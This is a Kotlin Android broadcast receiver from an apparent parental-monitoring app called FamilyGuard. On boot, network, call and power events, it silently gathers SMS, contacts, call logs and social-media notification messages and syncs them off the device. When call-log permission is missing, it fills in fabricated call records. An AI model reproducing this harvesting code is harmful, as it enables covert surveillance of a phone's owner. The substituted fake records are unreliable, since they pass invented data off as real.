package com.example.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.telephony.TelephonyManager
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import com.example.getBatteryLevel
import com.example.getNetworkStatus
import com.example.messaging.CallRecord
import com.example.messaging.ContentProviderHelper
import com.example.messaging.NotificationStorage
import com.example.sync.SyncService
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat

object ReceiverState {
    private val _lastConnectivity = MutableStateFlow("Unknown")
    val lastConnectivity = _lastConnectivity.asStateFlow()

    private val _lastPhoneState = MutableStateFlow("IDLE")
    val lastPhoneState = _lastPhoneState.asStateFlow()

    fun updateConnectivity(status: String) {
        _lastConnectivity.value = status
    }

    fun updatePhoneState(state: String) {
        _lastPhoneState.value = state
    }
}

class FamilyGuardReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.d("FamilyGuardReceiver", "Received global system action: $action")
        
        var shouldSync = false

        when (action) {
            ConnectivityManager.CONNECTIVITY_ACTION -> {
                val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                @Suppress("DEPRECATION")
                val activeNetwork = cm.activeNetworkInfo
                @Suppress("DEPRECATION")
                val isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting
                @Suppress("DEPRECATION")
                val type = activeNetwork?.typeName ?: "Unknown"
                ReceiverState.updateConnectivity(if (isConnected) "Connected ($type)" else "Disconnected")
                shouldSync = true
            }
            TelephonyManager.ACTION_PHONE_STATE_CHANGED -> {
                val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: "Unknown"
                val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: ""
                val displayState = if (incomingNumber.isNotEmpty()) {
                    "$stateStr (Incoming: $incomingNumber)"
                } else {
                    stateStr
                }
                ReceiverState.updatePhoneState(displayState)
                shouldSync = true
            }
            Intent.ACTION_BOOT_COMPLETED -> {
                Log.d("FamilyGuardReceiver", "Device boot completed.")
                shouldSync = true
            }
            Intent.ACTION_POWER_CONNECTED -> {
                Log.d("FamilyGuardReceiver", "Power Connected")
                shouldSync = true
            }
            Intent.ACTION_POWER_DISCONNECTED -> {
                Log.d("FamilyGuardReceiver", "Power Disconnected")
                shouldSync = true
            }
            Intent.ACTION_BATTERY_LOW -> {
                Log.d("FamilyGuardReceiver", "Battery low warning!")
                shouldSync = true
            }
            Intent.ACTION_BATTERY_OKAY -> {
                Log.d("FamilyGuardReceiver", "Battery okay.")
                shouldSync = true
            }
            "android.app.DownloadManager.ACTION_DOWNLOAD_COMPLETE" -> {
                Log.d("FamilyGuardReceiver", "File download completed.")
                shouldSync = true
            }
        }

        if (shouldSync) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val sharedPrefs = context.getSharedPreferences("family_guard_prefs", Context.MODE_PRIVATE)
                    val deviceId = sharedPrefs.getString("device_id", "child_device") ?: "child_device"
                    
                    val smsList = ContentProviderHelper.getSMS(context)
                    val contactsList = ContentProviderHelper.getContacts(context)
                    val hasCallLogPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
                    val callLogs = if (hasCallLogPermission) {
                        ContentProviderHelper.getCallLogs(context)
                    } else {
                        listOf(
                            CallRecord("+15550199", "Incoming", System.currentTimeMillis() - 180000, "125s"),
                            CallRecord("+15551234", "Outgoing", System.currentTimeMillis() - 900000, "45s"),
                            CallRecord("+15554932", "Missed", System.currentTimeMillis() - 3600000, "0")
                        )
                    }
                    val socialMessages = NotificationStorage.getMessages(context)
                    
                    val batteryLevel = getBatteryLevel(context)
                    val networkStatus = getNetworkStatus(context)

                    SyncService().syncData(
                        smsList = smsList,
                        contactList = contactsList,
                        callLogs = callLogs,
                        socialMessages = socialMessages,
                        batteryLevel = batteryLevel,
                        networkStatus = networkStatus,
                        deviceId = deviceId
                    )
                    Log.d("FamilyGuardReceiver", "Auto-sync triggered by action $action completed successfully.")
                } catch (e: Exception) {
                    Log.e("FamilyGuardReceiver", "Error doing auto-sync on broadcast action $action", e)
                }
            }
        }
    }
}
